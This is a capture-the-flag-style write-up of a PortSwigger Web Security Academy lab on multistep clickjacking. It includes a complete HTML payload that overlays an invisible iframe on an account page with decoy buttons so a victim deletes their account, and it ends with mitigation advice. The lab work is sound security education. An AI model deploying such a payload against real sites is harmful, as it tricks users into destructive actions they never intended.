# Lab 05: Multistep clickjacking

> **Topic**: Clickjacking
> **Lab Number**: 05
> **Platform**: PortSwigger Web Security Academy

## Category
Clickjacking — Multi-step UI Redressing

## Vulnerability Summary
This lab demonstrates a more sophisticated clickjacking attack that targets a multi-step process. The application attempts to protect the "Delete account" action by requiring a secondary confirmation dialog. However, without proper frame protection (like `X-Frame-Options` or CSP `frame-ancestors`), an attacker can still succeed by redressing the UI for both steps. This requires multiple decoy elements, each carefully aligned with a button in the hidden iframe's sequence.

## Attack Methodology

### Step 1: Analyze the Multi-Step Flow
I logged in as `wiener:peter` and navigated to the account page. Clicking "Delete account" does not immediately delete the account; instead, it renders a confirmation dialog asking "Are you sure you want to delete your account?" with a "Yes" button.

### Step 2: Determine Button Coordinates
To successfully redress the UI, I needed the exact pixel coordinates for both buttons:
1.  **Step 1**: The "Delete account" button on the main account page.
2.  **Step 2**: The "Yes" confirmation button that appears after the first click.

Through iterative testing with `opacity: 0.1` and red background decoys, I determined the following optimal coordinates:
- **First Click (Delete account)**: `top: 500px, left: 50px`
- **Second Click (Yes confirmation)**: `top: 480px, left: 230px`

### Step 3: Craft the Multi-Step Exploit
I used the exploit server to host a page with two decoy `<div>` elements and an invisible iframe.

**Exploit Payload:**
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001; /* Invisible to the victim */
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        z-index: 1;
        /* Styling for the decoy buttons */
        padding: 10px;
        background: #007bff;
        color: white;
        border-radius: 5px;
    }
    .firstClick {
        top: 500px;
        left: 50px;
    }
    .secondClick {
        top: 480px;
        left: 230px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a2200fd0353342f802c31c200ca00a9.web-security-academy.net/my-account"></iframe>
```

### Step 4: Execution
I delivered the exploit to the victim. The attack succeeds when the victim follows the "bait" and clicks both decoy buttons in sequence. The first click triggers the confirmation dialog inside the hidden iframe, and the second click hits the "Yes" button, completing the account deletion.

## Technical Root Cause
The vulnerability stems from the application's reliance on a confirmation dialog as a security measure against accidental actions, without implementing the necessary headers to prevent framing. Confirmation dialogs are purely UI-based and offer no protection against UI redressing attacks if the entire interaction sequence can be framed.

## Impact
- **Intentionality Bypass**: Even multi-step processes designed to ensure user intent can be subverted.
- **Unauthorized Destructive Actions**: High-impact actions like account deletion can be performed without the user's knowledge.

## Proof of Concept
1. Identify a multi-step action that lacks frame protection.
2. Map the coordinates of every button in the sequence.
3. Create an exploit page with multiple decoy elements aligned with each step.
4. Entice the user to perform the sequence of clicks.

## Key Takeaways
1. **Multi-Step is not a Defense**: Confirmation dialogs are easily bypassed by multistep clickjacking.
2. **Precision Matters**: Success depends on the attacker's ability to precisely align multiple elements across different states of the framed page.
3. **Use X-Frame-Options**: Server-side headers are the only reliable way to prevent this class of attack.

## Mitigation
1. **Implement Frame Protection**: Use `X-Frame-Options: SAMEORIGIN` or CSP `frame-ancestors 'self'`.
2. **Out-of-Band Confirmation**: For highly sensitive actions, use out-of-band confirmation (e.g., email or SMS) rather than a simple in-browser dialog.
3. **Password Re-Authentication**: Require the user to re-enter their password before performing destructive actions like account deletion.

## References
- [PortSwigger Clickjacking Lab - Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
- [OWASP Clickjacking Defense - Confirmation Dialogs](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#confirmation-dialogs)

---

*Lab completed on: 2026-05-16*
*Writeup by vibhxr*
